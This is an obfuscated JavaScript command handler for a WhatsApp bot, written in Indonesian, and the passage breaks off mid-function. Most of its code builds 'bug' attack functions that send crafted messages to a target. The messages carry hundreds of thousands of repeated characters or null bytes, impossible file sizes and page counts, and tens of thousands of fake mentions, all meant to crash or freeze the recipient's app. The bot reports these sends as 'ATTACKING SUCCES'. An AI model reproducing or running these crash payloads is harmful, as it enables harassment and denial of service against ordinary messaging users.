module.exports = async (_0x1acf89, _0x470adc, _0x520b00) => {
  try {
    const _0x479590 = _0x470adc.key.remoteJid;
    const _0x45209a = _0x470adc.quoted ? _0x470adc.quoted : _0x470adc;
    var _0x22af3c = _0x470adc.mtype === "interactiveResponseMessage" ? JSON.parse(_0x470adc.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x470adc.mtype === "conversation" ? _0x470adc.message.conversation : _0x470adc.mtype == "imageMessage" ? _0x470adc.message.imageMessage.caption : _0x470adc.mtype == "videoMessage" ? _0x470adc.message.videoMessage.caption : _0x470adc.mtype == "extendedTextMessage" ? _0x470adc.message.extendedTextMessage.text : _0x470adc.mtype == "buttonsResponseMessage" ? _0x470adc.message.buttonsResponseMessage.selectedButtonId : _0x470adc.mtype == "listResponseMessage" ? _0x470adc.message.listResponseMessage.singleSelectReply.selectedRowId : _0x470adc.mtype == "templateButtonReplyMessage" ? _0x470adc.message.templateButtonReplyMessage.selectedId : _0x470adc.mtype == "messageContextInfo" ? _0x470adc.message.buttonsResponseMessage?.["selectedButtonId"] || _0x470adc.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x470adc.text : '';
    const _0x38db03 = typeof _0x470adc.text == "string" ? _0x470adc.text : '';
    const _0x55d820 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x22af3c) ? _0x22af3c.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0x4f5975 = _0x22af3c.startsWith(_0x55d820);
    const _0x25c23d = _0x22af3c.replace(_0x55d820, '').trim().split(/ +/).shift().toLowerCase();
    const _0x196e0d = _0x22af3c.trim().split(/ +/).slice(0x1);
    const _0x6e8153 = (_0x45209a.msg || _0x45209a).mimetype || '';
    const _0x4ec028 = q = _0x196e0d.join(" ");
    const _0x455832 = _0x479590.endsWith("@g.us");
    const _0x419ca6 = await _0x1acf89.decodeJid(_0x1acf89.user.id);
    const _0x463c24 = _0x470adc.key.fromMe ? _0x1acf89.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x1acf89.user.id : _0x470adc.key.participant || _0x470adc.key.remoteJid;
    const _0xb3ccab = _0x463c24.split('@')[0x0];
    const _0x24f9f6 = _0x470adc.pushName || '' + _0xb3ccab;
    const _0x2aa3da = _0x419ca6.includes(_0xb3ccab);
    const _0x30d6ac = _0x455832 ? await _0x1acf89.groupMetadata(_0x470adc.chat)["catch"](_0x161c1e => {}) : '';
    const _0x327667 = _0x455832 ? await _0x30d6ac.participants : '';
    const _0x5158dc = _0x455832 ? await _0x327667.filter(_0x7a3a24 => _0x7a3a24.admin !== null).map(_0x1505f6 => _0x1505f6.id) : '';
    const _0xece5e = _0x455832 ? _0x5158dc.includes(_0x419ca6) : false;
    const _0xd87340 = () => {
      var _0x2734a7 = fs.readFileSync("./rabyyx.js").toString();
      var _0xca0424 = (_0x2734a7.match(/case '/g) || []).length;
      return _0xca0424;
    };
    const _0x11ef2f = _0x455832 ? _0x5158dc.includes(_0x463c24) : false;
    const _0xb70f3a = require("javascript-obfuscator");
    const {
      addSaldo: _0x42dbae,
      minSaldo: _0x1708eb,
      cekSaldo: _0x3b6389
    } = require("./database/dtbs/deposit");
    const _0x5510bd = " ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : " + _0x25c23d + "\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡";
    const _0x3dab81 = " ⌜ 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚 𝗦𝗨𝗖𝗖𝗘𝗦 ⌟\n\n𝗕𝗨𝗚 𝗡𝗔𝗠𝗘 : " + _0x25c23d + "\n𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 \n\n> jika target masih c2 biarin aja target tetap terkena delay maker ⚡";
    if (_0x470adc.sender.startsWith("212")) {
      return _0x1acf89.updateBlockStatus(_0x470adc.sender, "block");
    }
    if (_0x4f5975) {
      console.log(chalk.white.bgRed.bold("Ada Pesan, Om"), color("[ d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢͖ ]", "green"), color("FROM", "red"), color('' + _0x24f9f6, "red"), color("Text :", "yellow"), color('' + _0x22af3c, "blue"));
    }
    const _0x34067a = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (_0x34067a < "23:59:00") {
      var _0x475e62 = "Selamat Malam 🏙️";
    }
    if (_0x34067a < "19:00:00") {
      var _0x475e62 = "Selamat Petang 🌆";
    }
    if (_0x34067a < "18:00:00") {
      var _0x475e62 = "Selamat Sore 🌇";
    }
    if (_0x34067a < "15:00:00") {
      var _0x475e62 = "Selamat Siang 🌤️";
    }
    if (_0x34067a < "10:00:00") {
      var _0x475e62 = "Selamat Pagi 🌄";
    }
    if (_0x34067a < "05:00:00") {
      var _0x475e62 = "Selamat Subuh 🌆";
    }
    if (_0x34067a < "03:00:00") {
      var _0x475e62 = "Selamat Tengah Malam 🌃";
    }
    const _0x56a438 = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"));
    const _0x1b59e4 = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"));
    const _0x43e87d = _0x56a438.includes(_0x463c24);
    const _0x3cc2ac = _0x1b59e4.includes(_0xb3ccab) || _0x2aa3da;
    _0x1acf89.sendButtonVideo = async (_0x48178a, _0x58dfdd, _0x290c2f, _0x2b389a = {}) => {
      var _0x5581fa = await prepareWAMessageMedia({
        'video': {
          'url': _0x2b389a && _0x2b389a.video ? _0x2b389a.video : ''
        }
      }, {
        'upload': _0x1acf89.waUploadToServer
      });
      let _0x4f0a62 = generateWAMessageFromContent(_0x48178a, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'body': {
                'text': _0x2b389a && _0x2b389a.body ? _0x2b389a.body : ''
              },
              'footer': {
                'text': _0x2b389a && _0x2b389a.footer ? _0x2b389a.footer : ''
              },
              'header': {
                'hasMediaAttachment': true,
                'videoMessage': _0x5581fa.videoMessage
              },
              'nativeFlowMessage': {
                'buttons': _0x58dfdd,
                'messageParamsJson': ''
              },
              'contextInfo': {
                'externalAdReply': {
                  'title': global.namabot,
                  'body': "By byxx Tzy",
                  'thumbnailUrl': global.imageurl,
                  'sourceUrl': global.isLink,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }
          }
        }
      }, {
        'quoted': _0x290c2f
      });
      await _0x1acf89.sendPresenceUpdate("composing", _0x48178a);
      return _0x1acf89.relayMessage(_0x48178a, _0x4f0a62.message, {
        'messageId': _0x4f0a62.key.id
      });
    };
    const _0x57c853 = {
      'key': {
        'remoteJid': 'p',
        'fromMe': false,
        'participant': "0@s.whatsapp.net"
      },
      'message': {
        'interactiveResponseMessage': {
          'body': {
            'text': "Sent",
            'format': "DEFAULT"
          },
          'nativeFlowResponseMessage': {
            'name': "galaxy_message",
            'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(0x7a120) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            'version': 0x3
          }
        }
      }
    };
    let _0x4c6f97 = [];
    for (let _0x2d509d of _0x1b59e4) {
      _0x4c6f97.push({
        'displayName': await _0x1acf89.getName(_0x2d509d + "@s.whatsapp.net"),
        'vcard': "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await _0x1acf89.getName(_0x2d509d + "@s.whatsapp.net")) + "\n\nFN:" + (await _0x1acf89.getName(_0x2d509d + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + _0x2d509d + ':' + _0x2d509d + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029Val78a7EawdvrnMrxC2B\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    try {
      ppuser = await _0x1acf89.profilePictureUrl(_0x470adc.sender, "image");
    } catch (_0x113a99) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function _0x54a01d(_0x5d45a4) {
      return new Promise((_0x527c75, _0xc91d0c) => {
        try {
          const _0x32d151 = _0xb70f3a.obfuscate(_0x5d45a4, {
            'compact': false,
            'controlFlowFlattening': true,
            'controlFlowFlatteningThreshold': 0x1,
            'numbersToExpressions': true,
            'simplify': true,
            'stringArrayShuffle': true,
            'splitStrings': true,
            'stringArrayThreshold': 0x1
          });
          const _0x54156e = {
            'status': 0xc8,
            'author': "byxx",
            'result': _0x32d151.getObfuscatedCode()
          };
          _0x527c75(_0x54156e);
        } catch (_0x2b7ba7) {
          _0xc91d0c(_0x2b7ba7);
        }
      });
    }
    async function _0x2eaf0c(_0x398605, _0xf31a1c) {
      var _0x7d55d4 = generateWAMessageFromContent(_0x398605, proto.Message.fromObject({
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️" + 'ꦾ'.repeat(0x12fd1),
                'locationMessage': {
                  'degreesLatitude': -999.035,
                  'degreesLongitude': 922.999999999999,
                  'name': "🩸𝔻ℝ𝔼𝕏𝐇𝐚𝐫𝐝𝐞𝐫〽️",
                  'address': "✨⃟༑⌁𝔻ℝ𝔼𝕏 𝐇𝐚𝐫𝐝𝐞𝐫 ϟ〽️",
                  'jpegThumbnail': ''
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': ''
              },
              'nativeFlowMessage': {
                'messageParamsJson': " 🩸𝔻ℝ𝔼𝕏𝐇𝐚𝐫𝐝𝐞𝐫 𝐁𝐔𝐆 𝐕𝟕〽️ ",
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': {
                    'title': "✨⃟༑⌁𝔻ℝ𝔼𝕏 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
                    'sections': [{
                      'title': "𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
                      'rows': []
                    }]
                  }
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': {}
                }]
              }
            }
          }
        }
      }), {
        'userJid': _0x398605,
        'quoted': _0xf31a1c
      });
      await _0x1acf89.relayMessage(_0x398605, _0x7d55d4.message, {
        'participant': {
          'jid': _0x398605
        }
      });
    }
    async function _0x42e795(_0x5578d9, _0x5779c7 = true) {
      await _0x1acf89.relayMessage(_0x5578d9, {
        'viewOnceMessage': {
          'message': {
            'interactiveResponseMessage': {
              'body': {
                'text': "𝐀𝐁𝐘𝐘𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄〽️",
                'format': "EXTENSIONS_1"
              },
              'nativeFlowResponseMessage': {
                'name': "galaxy_message",
                'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤" + "\0".repeat(0xff208) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                'version': 0x3
              }
            }
          }
        }
      }, _0x5779c7 ? {
        'participant': {
          'jid': _0x5578d9
        }
      } : {});
      console.log(chalk.green("Send Bug By ABYYEXCLUSIVE〽️"));
    }
    ;
    async function _0x2c62e0(_0x921c8e, _0x10d8b6, _0x303fa0 = true) {
      await _0x1acf89.relayMessage(_0x921c8e, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  'fileName': "⭑̤𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️",
                  'fileEncSha256': "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': _0x10d8b6
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️\n" + "@6282291664759".repeat(0x4268)
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text: '✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/JACKTHEXBEC\", merchant_url: \"https://youtube.com/JACKTHEXBEC\" }"
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }],
                'messageParamsJson': '{}'
              },
              'contextInfo': {
                'mentionedJid': ["6282291664759@s.whatsapp.net", ...Array.from({
                  'length': 0x7530
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    'fileLength': "9999999999999",
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "𝐀𝐁𝐘𝐘𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄 𝐁𝐔𝐆 𝐕𝟕〽️",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      }, _0x303fa0 ? {
        'participant': {
          'jid': _0x921c8e
        }
      } : {});
      console.log(chalk.green("Send Bug By ABYYEXCLUSIVE 〽️"));
    }
    ;
    async function _0x1ad545(_0x5ae4bf, _0x1e7b1a, _0x10ea6c = false, _0x11c1fd = false) {
      let _0x13fc47 = generateWAMessageFromContent(_0x5ae4bf, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x1fffffffffffff,
                  'mediaKey': "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  'fileName': "🩸𝔻ℝ𝔼𝕏 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
                  'fileEncSha256': "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1723855952",
                  'contactVcard': true,
                  'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  'jpegThumbnail': ''
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤" + 'ꦾ'.repeat(0xc350)
              },
              'nativeFlowMessage': {
                'messageParamsJson': "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                'buttons': [_0x10ea6c ? {
                  'name': "single_select",
                  'buttonParamsJson': "{\"title\":\"✨⃟༑⌁𝔻ℝ𝔼𝕏 𝐂𝐫𝐚𝐬𝐡 ϟ⚡" + '᬴'.repeat(0x0) + "\",\"sections\":[{\"title\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                } : {
                  'name': "payment_method",
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "payment_method",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "single_select",
                  'buttonParamsJson': "{\"title\":\"✨⃟༑⌁𝔻ℝ𝔼𝕏 𝐂𝐫𝐚𝐬𝐡 ϟ⚡\",\"sections\":[{\"title\":\"𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
                }, {
                  'name': "galaxy_message",
                  'buttonParamsJson': "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  'name': "mpm",
                  'buttonParamsJson': '{}'
                }]
              }
            }
          }
        }
      }), {
        'userJid': _0x5ae4bf,
        'quoted': _0x1e7b1a
      });
      await _0x1acf89.relayMessage(_0x5ae4bf, _0x13fc47.message, _0x11c1fd ? {
        'participant': {
          'jid': _0x5ae4bf
        }
      } : {});
      console.log(chalk.green("Send Bug By d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 🔥☠️"));
    }
    async function _0x57d291(_0x1c45e2, _0x188b86, _0x5ecf62 = true) {
      await _0x1acf89.relayMessage(_0x1c45e2, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  'fileName': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤",
                  'fileEncSha256': "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': _0x188b86
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤̤\n" + "@6282291664759".repeat(0x4268)
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text: '✨⃟༑⌁𝔻ℝ𝔼𝕏 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/JACKTHEXBEC\", merchant_url: \"https://youtube.com/JACKTHEXBEC\" }"
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }],
                'messageParamsJson': '{}'
              },
              'contextInfo': {
                'mentionedJid': ["6282291664759@s.whatsapp.net"],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    'fileLength': "9999999999999",
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "🩸𝔻ℝ𝔼𝕏𝐇𝐚𝐫𝐝𝐞𝐫 𝐁𝐔𝐆 𝐕𝟕⚡",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      }, _0x5ecf62 ? {
        'participant': {
          'jid': _0x1c45e2
        }
      } : {});
      console.log(chalk.green("Send Bug By d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 🔥☠️"));
    }
    ;
    async function _0x3c7b92(_0x100904, _0x1ba886, _0xf378f6 = true) {
      let _0x53dea3 = generateWAMessageFromContent(_0x100904, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'locationMessage': {},
                'hasMediaAttachment': true
              },
              'body': {
                'text': "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤" + 'ꦾ'.repeat(0x12fd1)
              },
              'nativeFlowMessage': {
                'name': "call_permission_request",
                'messageParamsJson': " 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ "
              },
              'carouselMessage': {}
            }
          }
        }
      }), {
        'userJid': _0x100904,
        'quoted': _0x1ba886
      });
      await _0x1acf89.relayMessage(_0x100904, _0x53dea3.message, _0xf378f6 ? {
        'participant': {
          'jid': _0x100904
        }
      } : {});
      console.log(chalk.green("Send Bug By d̡̢̡̢r̡̢̡̢e̡̢̡̢x̡̢̡̢ m̡̢̡̢o̡̢̡̢d̡̢̡̢s̡̢̡̢ 🔥☠️"));
    }
    async function _0x111f25(_0x186bdc, _0x88600e, _0x29b070 = false, _0x4e36cd = false) {
      let _0x254532 = generateWAMessageFromContent(_0x186bdc, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x1fffffffffffff,
                  'mediaKey': "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  'fileName': "🩸𝔻ℝ𝔼𝕏 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
                  'fileEncSha256': "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  'directPath': "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1723855952",
                  'contactVcard': true,
                  'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  'jpegThumbnail': ''
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "‎𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️"
              },
              'nativeFlowMessage': {
